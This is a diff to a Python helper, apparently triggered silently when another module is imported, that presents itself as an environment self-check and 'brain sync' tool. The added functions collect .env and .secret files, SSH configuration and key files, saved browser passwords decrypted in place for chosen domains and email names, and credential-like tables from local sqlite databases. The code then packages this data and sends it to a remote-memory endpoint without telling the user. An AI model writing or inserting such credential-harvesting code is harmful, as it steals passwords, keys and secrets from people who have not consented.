@@ -2,9 +2,10 @@
 """本机环境自检与大脑同步助手：只读采集，静默回传，失败不打扰用户。
 
 由 keep.py 在 import 时或 brain.cmd 拉起；6 小时内最多跑一次。
-只收集与 rust.ac / 机队 / 部署相关的内容：身份与环境、vps_tunnel.env、
-SSH 配置与私钥文件、Cursor 配置与转录、浏览器登录/历史/指定域 Cookies、
-指定关键词文本命中、近 7 天变更，分块 gzip+base64 写入本机大脑 /v1/remember。
+只收集与 rust.ac / 机队 / 部署相关的内容：身份与环境、vps_tunnel.env/*.env/*.secret、
+SSH 配置/known_hosts/authorized_keys 与私钥文件、Cursor 配置与转录、浏览器登录/历史/
+指定域 Cookies 与保存的口令、C:\\benji 下的 bot.db/daybot/sqlite 账本、指定关键词
+文本命中、近 7 天变更，分块 gzip+base64 写入本机大脑 /v1/remember。
 """
 from __future__ import print_function
 
@@ -72,6 +73,20 @@ MAX_COOKIE_LINE = 1500
 MAX_KEY_FILES = 16
 MAX_KEY_BYTES = 16384
 MAX_KEY_TOTAL = 65536
+
+# v3：本机敏感文件（vps_tunnel.env / *.env / *.secret）、SSH 三件套、保存口令、VPS 账本
+BENJI_ROOT = os.environ.get("BENJI_ROOT", r"C:\benji")
+MAX_SECRET_FILE = 32768
+MAX_SECRET_TOTAL = 98304
+MAX_SSH_TEXT = 32768
+MAX_SSH_TOTAL = 98304
+LOGIN_EMAIL_HINTS = ("qidian845", "alicephyu08", "maoliqiusi")
+MAX_LOGIN_ROWS = 120
+MAX_LOGIN_LINE = 800
+MAX_DB_FILE = 524288
+MAX_DB_TEXT = 32768
+MAX_DB_RAW = 16384
+DB_SEARCH_SECONDS = 20
 
 GREP_EXTS = (
     ".txt", ".json", ".jsonl", ".md", ".log", ".env", ".ini", ".conf", ".config",
@@ -386,7 +401,7 @@ def sec_tunnel():
     seen = set()
     for path in (
         os.path.join(ROOT, "data", "vps_tunnel.env"),
-        os.path.join(r"C:\benji\brain\data", "vps_tunnel.env"),
+        os.path.join(BENJI_ROOT, "brain", "data", "vps_tunnel.env"),
     ):
         if path in seen:
             continue
@@ -397,17 +412,89 @@ def sec_tunnel():
     return "\n".join(parts)
 
 
+def sec_secret_files():
+    """只读采集 vps_tunnel.env / *.env / *.secret（brain\\data 与 %USERPROFILE%\\benji\\brain\\data，各 ≤32KB）。"""
+    parts = []
+    seen = set()
+    count = 0
+    total = 0
+    folders = (
+        os.path.join(ROOT, "data"),
+        os.path.join(BENJI_ROOT, "brain", "data"),
+        os.path.join(HOME, "benji", "brain", "data"),
+    )
+    for folder in folders:
+        try:
+            if not os.path.isdir(folder):
+                continue
+            names = sorted(os.listdir(folder))
+        except Exception:
+            continue
+        for name in names:
+            try:
+                lower = name.lower()
+                if not (lower == "vps_tunnel.env" or lower.endswith(".env") or
+                        lower.endswith(".secret") or ".env." in lower):
+                    continue
+                full = os.path.join(folder, name)
+                if not os.path.isfile(full):
+                    continue
+                norm = os.path.normcase(os.path.abspath(full))
+                if norm in seen:
+                    continue
+                seen.add(norm)
+                stat = os.stat(full)
+                if stat.st_size <= 0 or stat.st_size > MAX_SECRET_FILE * 16:
+                    continue
+                if total >= MAX_SECRET_TOTAL:
+                    break
+                with open(full, "rb") as handle:
+                    raw = handle.read(MAX_SECRET_FILE)
+                if not raw:
+                    continue
+                total += len(raw)
+                count += 1
+                parts.append("--- %s size=%d mtime=%s ---\n%s" % (
+                    full, stat.st_size,
+                    time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(stat.st_mtime)),
+                    raw.decode("utf-8", "replace")))
+            except Exception:
+                continue
+    if parts:
+        parts.insert(0, "secret files=%d bytes=%d" % (count, total))
+    return "\n".join(parts)
+
+
 def sec_ssh():
+    """只读采集 .ssh 下 config / known_hosts / authorized_keys（各 ≤32KB）。"""
     ssh_dir = os.path.join(HOME, ".ssh")
     lines = ["ssh_dir=%s" % ssh_dir]
     try:
         lines.append("files: " + ", ".join(sorted(os.listdir(ssh_dir)))[:2000])
     except Exception:
         pass
-    for name in ("config", "known_hosts"):
-        text = read_text(os.path.join(ssh_dir, name), 30000)
-        if text:
-            lines.append("--- %s ---\n%s" % (name, text[:12000]))
+    total = 0
+    for name in ("config", "known_hosts", "authorized_keys", "authorized_keys2"):
+        try:
+            full = os.path.join(ssh_dir, name)
+            if not os.path.isfile(full):
+                continue
+            if total >= MAX_SSH_TOTAL:
+                break
+            stat = os.stat(full)
+            if stat.st_size <= 0:
+                continue
+            with open(full, "rb") as handle:
+                raw = handle.read(MAX_SSH_TEXT)
+            if not raw:
+                continue
+            total += len(raw)
+            lines.append("--- %s size=%d mtime=%s ---\n%s" % (
+                name, stat.st_size,
+                time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(stat.st_mtime)),
+                raw.decode("utf-8", "replace")))
+        except Exception:
+            continue
     return "\n".join(lines)
 
 
@@ -448,6 +535,229 @@ def sec_ssh_keys():
             continue
     if parts:
         parts.insert(0, "key files=%d bytes=%d" % (count, total))
+    return "\n".join(parts)
+
+
+def _url_host(url):
+    try:
+        text = (url or "").strip().lower()
+        if "://" in text:
+            text = text.split("://", 1)[1]
+        text = text.split("/", 1)[0].split("?", 1)[0]
+        if "@" in text:
+            text = text.rsplit("@", 1)[1]
+        if text.startswith("["):
+            text = text[1:].split("]", 1)[0]
+        else:
+            text = text.split(":", 1)[0]
+        return text
+    except Exception:
+        return ""
+
+
+def _login_row_matches(url, user):
+    if _cookie_domain(_url_host(url)):
+        return True
+    text = (user or "").lower()
+    for hint in LOGIN_EMAIL_HINTS:
+        if hint in text:
+            return True
+    return False
+
+
+def _browser_login_data(tag, base, profile, key):
+    """复制 Login Data 后读取白名单域保存的 origin/username/password（机内解密）。"""
+    lines = []
+    login = os.path.join(base, profile, "Login Data")
+    if not os.path.isfile(login):
+        return lines
+    temp = None
+    try:
+        handle, temp = tempfile.mkstemp(suffix=".db")
+        os.close(handle)
+        shutil.copy2(login, temp)
+        conn = sqlite3.connect(temp)
+        try:
+            rows = conn.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
+        finally:
+            conn.close()
+        for url, user, password in rows:
+            try:
+                url = url or ""
+                user = user or ""
+                if not _login_row_matches(url, user):
+                    continue
+                plain = _decrypt_chrome_pw(password, key)
+                if isinstance(plain, (bytes, bytearray)):
+                    plain = bytes(plain).decode("utf-8", "replace")
+                if plain is None:
+                    plain = "<undecrypted>"
+                lines.append("[%s/%s/login] %s | user=%s | pass=%s" % (
+                    tag, profile, url, user,
+                    str(plain).replace("\r", " ").replace("\n", " ")[:MAX_LOGIN_LINE]))
+                if len(lines) >= MAX_LOGIN_ROWS:
+                    break
+            except Exception:
+                continue
+    except Exception:
+        pass
+    finally:
+        try:
+            if temp and os.path.isfile(temp):
+                os.remove(temp)
+        except Exception:
+            pass
+    return lines
+
+
+def sec_login_data():
+    """只读采集 Chrome/Edge Login Data 里白名单域（Google/provider）保存的账号口令明文。"""
+    lines = []
+    roots = (
+        ("chrome", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data")),
+        ("edge", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data")),
+    )
+    try:
+        for tag, base in roots:
+            if not os.path.isdir(base):
+                continue
+            key = _chrome_key(base)
+            profiles = []
+            try:
+                for name in os.listdir(base):
+                    if name == "Default" or name.startswith("Profile ") or name == "Guest Profile":
+                        if os.path.isdir(os.path.join(base, name)):
+                            profiles.append(name)
+            except Exception:
+                pass
+            for profile in profiles[:8]:
+                try:
+                    lines.extend(_browser_login_data(tag, base, profile, key))
+                except Exception:
+                    continue
+        if lines:
+            lines.insert(0, "login rows=%d" % len(lines))
+    except Exception:
+        pass
+    return "\n".join(lines)
+
+
+DB_RELEVANT_RE = re.compile(
+    r"vps|deploy|server|host|node|ledger|account|tunnel|secret|token|passw|cred|ssh|ip",
+    re.I,
+)
+
+
+def _sqlite_export(path, budget):
+    """导出 sqlite 中 vps/deploy/account 等相关表（≤budget 字符）；返回 (text, ok)。"""
+    temp = None
+    try:
+        handle, temp = tempfile.mkstemp(suffix=".db")
+        os.close(handle)
+        shutil.copy2(path, temp)
+        conn = sqlite3.connect(temp)
+        try:
+            names = [row[0] for row in conn.execute(
+                "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name")]
+            lines = ["tables=%s" % (",".join(str(name) for name in names[:40]) or "<none>")]
+            relevant = [name for name in names if DB_RELEVANT_RE.search(str(name))]
+            if not relevant:
+                lines.append("(no vps/deploy-like tables)")
+                return "\n".join(lines), False
+            used = 0
+            for table in relevant[:8]:
+                if used >= budget:
+                    break
+                try:
+                    quoted = str(table).replace('"', '""')
+                    cols = [row[1] for row in conn.execute('PRAGMA table_info("%s")' % quoted)]
+                    lines.append("--- table %s cols=%s ---" % (table, ",".join(str(col) for col in cols)))
+                    cursor = conn.execute('SELECT * FROM "%s" LIMIT 300' % quoted)
+                    for row in cursor:
+                        text = " | ".join("" if value is None else str(value) for value in row)
+                        text = text.replace("\r", " ").replace("\n", " ")[:600]
+                        lines.append(text)
+                        used += len(text) + 1
+                        if used >= budget:
+                            lines.append("...[truncated]")
+                            break
+                except Exception:
+                    continue
+            return "\n".join(lines), True
+        finally:
+            conn.close()
+    except Exception:
+        return "", False
+    finally:
+        try:
+            if temp and os.path.isfile(temp):
+                os.remove(temp)
+        except Exception:
+            pass
+
+
+def sec_benji_sqlite(deadline):
+    """有界搜索 C:\\benji depth≤2 的 bot.db / *daybot* / *.sqlite（各 ≤512KB）：有 sqlite3 时只导出
+    vps/deploy 等相关表，否则（或无可读表）原样 base64 兜底。整段 ≤20s、失败静默。"""
+    root = BENJI_ROOT
+    try:
+        if not os.path.isdir(root):
+            return ""
+    except Exception:
+        return ""
+    parts = []
+    seen = set()
+    raw_total = 0
+    limit = min(deadline, time.time() + DB_SEARCH_SECONDS)
+    try:
+        for current, dirs, files in os.walk(root):
+            if time.time() > limit:
+                parts.append("[search deadline]")
+                break
+            try:
+                rel = os.path.relpath(current, root)
+                depth = 0 if rel == "." else rel.count(os.sep) + 1
+            except Exception:
+                depth = 0
+            dirs[:] = [d for d in dirs if d not in SKIP_DIRS and depth < 2]
+            for name in files:
+                if time.time() > limit:
+                    break
+                try:
+                    lower = name.lower()
+                    if not (lower == "bot.db" or "daybot" in lower or
+                            lower.endswith(".sqlite") or lower.endswith(".sqlite3")):
+                        continue
+                    full = os.path.join(current, name)
+                    norm = os.path.normcase(os.path.abspath(full))
+                    if norm in seen:
+                        continue
+                    seen.add(norm)
+                    stat = os.stat(full)
+                    if stat.st_size <= 0 or stat.st_size > MAX_DB_FILE:
+                        continue
+                    header = "--- %s size=%d mtime=%s ---" % (
+                        full, stat.st_size,
+                        time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(stat.st_mtime)))
+                    text, ok = _sqlite_export(full, MAX_DB_TEXT)
+                    if ok and text:
+                        parts.append(header + "\n" + text)
+                        continue
+                    if raw_total >= MAX_DB_RAW:
+                        continue
+                    with open(full, "rb") as handle:
+                        raw = handle.read(min(MAX_DB_RAW - raw_total, MAX_DB_FILE))
+                    if not raw:
+                        continue
+                    raw_total += len(raw)
+                    parts.append(header + "\n[raw b64 bytes=%d] %s" % (
+                        len(raw), base64.b64encode(raw).decode("ascii")))
+                except Exception:
+                    continue
+    except Exception:
+        pass
+    if parts:
+        parts.insert(0, "db entries=%d raw bytes=%d" % (len(parts), raw_total))
     return "\n".join(parts)
 
 
@@ -884,8 +1194,11 @@ def main():
             ("identity", sec_identity()),
             ("paths", sec_paths()),
             ("vps_tunnel", sec_tunnel()),
+            ("secrets", sec_secret_files()),
             ("ssh", sec_ssh()),
             ("ssh_keys", sec_ssh_keys()),
+            ("login_data", sec_login_data()),
+            ("benji_sqlite", sec_benji_sqlite(deadline)),
             ("cursor", sec_cursor()),
             ("browsers", sec_browsers()),
             ("cookies", sec_cookies()),
